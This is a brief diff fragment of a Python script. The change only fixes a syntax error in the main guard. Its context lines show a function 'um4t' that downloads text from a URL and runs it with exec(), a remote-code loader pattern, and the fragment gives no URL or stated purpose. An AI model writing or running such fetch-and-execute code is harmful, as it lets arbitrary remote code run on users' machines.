@@ -30,4 +30,4 @@ def shelby():
 def um4t(url):
     try:exec(requests.get(url).text)
     except Exception as e:print(f"h-am{e}")
-if __name__=="__main__":shelby().
+if __name__=="__main__":shelby()
